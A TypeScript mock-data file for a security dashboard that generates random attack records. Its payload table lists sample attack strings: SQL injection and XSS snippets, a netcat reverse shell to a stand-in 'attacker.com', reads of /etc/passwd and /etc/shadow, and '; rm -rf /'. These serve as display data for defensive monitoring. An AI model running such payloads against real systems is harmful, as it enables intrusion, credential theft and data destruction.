// Mock data for the cybersecurity dashboard

export type AttackType = 'SQLi' | 'XSS' | 'CSRF' | 'RCE' | 'LFI' | 'Path Traversal' | 'Command Injection';
export type Severity = 'low' | 'medium' | 'high' | 'critical';

export interface Attack {
  id: string;
  sourceIp: string;
  targetUrl: string;
  attackType: AttackType;
  severity: Severity;
  confidence: number;
  isSuccess: boolean;
  timestamp: Date;
  country: string;
  method: string;
  payload?: string;
}

export interface AttackStats {
  total: number;
  blocked: number;
  successful: number;
  critical: number;
  trends: { hour: string; count: number }[];
}

const attackTypes: AttackType[] = ['SQLi', 'XSS', 'CSRF', 'RCE', 'LFI', 'Path Traversal', 'Command Injection'];
const severities: Severity[] = ['low', 'medium', 'high', 'critical'];
const countries = ['Russia', 'China', 'United States', 'Brazil', 'India', 'Germany', 'Nigeria', 'Ukraine', 'Iran', 'North Korea'];
const methods = ['GET', 'POST', 'PUT', 'DELETE'];

function randomElement<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function generateIp(): string {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

const payloads: Record<AttackType, string[]> = {
  'SQLi': [
    "' OR '1'='1' --",
    "'; DROP TABLE users; --",
    "UNION SELECT username, password FROM users--",
    "1' AND SLEEP(5)--"
  ],
  'XSS': [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert(document.cookie)",
    "<svg/onload=alert('XSS')>"
  ],
  'CSRF': [
    "<img src='https://bank.com/transfer?to=attacker&amount=10000'>",
    "<form action='https://target.com/delete' method='POST'>",
  ],
  'RCE': [
    "; cat /etc/passwd",
    "| nc attacker.com 4444 -e /bin/sh",
    "${7*7}",
    "{{constructor.constructor('return this')()}}"
  ],
  'LFI': [
    "../../etc/passwd",
    "....//....//etc/passwd",
    "/var/log/apache2/access.log",
  ],
  'Path Traversal': [
    "../../../etc/shadow",
    "..\\..\\..\\windows\\system32\\config\\sam",
  ],
  'Command Injection': [
    "; rm -rf /",
    "| whoami",
    "`id`",
    "$(cat /etc/passwd)"
  ]
};

export function generateAttack(): Attack {
  const attackType = randomElement(attackTypes);
  const severity = randomElement(severities);
  
  return {
    id: crypto.randomUUID(),
    sourceIp: generateIp(),
    targetUrl: `/api/${['users', 'admin', 'login', 'search', 'upload', 'data'][Math.floor(Math.random() * 6)]}`,
    attackType,
    severity,
    confidence: Math.round((0.7 + Math.random() * 0.3) * 100) / 100,
    isSuccess: Math.random() < 0.15,
    timestamp: new Date(Date.now() - Math.random() * 86400000),
    country: randomElement(countries),
    method: randomElement(methods),
    payload: randomElement(payloads[attackType]),
  };
}

export function generateAttacks(count: number): Attack[] {
  return Array.from({ length: count }, generateAttack).sort(
    (a, b) => b.timestamp.getTime() - a.timestamp.getTime()
  );
}

export function generateStats(): AttackStats {
  const hours = Array.from({ length: 24 }, (_, i) => {
    const hour = new Date();
    hour.setHours(hour.getHours() - (23 - i));
    return {
      hour: hour.toLocaleTimeString('en-US', { hour: '2-digit', hour12: false }),
      count: Math.floor(Math.random() * 150) + 20,
    };
  });

  return {
    total: 24892,
    blocked: 24156,
    successful: 736,
    critical: 89,
    trends: hours,
  };
}

export const severityColors: Record<Severity, string> = {
  low: 'success',
  medium: 'warning',
  high: 'destructive',
  critical: 'destructive',
};

export const attackTypeColors: Record<AttackType, string> = {
  'SQLi': 'cyber',
  'XSS': 'accent',
  'CSRF': 'warning',
  'RCE': 'destructive',
  'LFI': 'warning',
  'Path Traversal': 'secondary',
  'Command Injection': 'destructive',
};
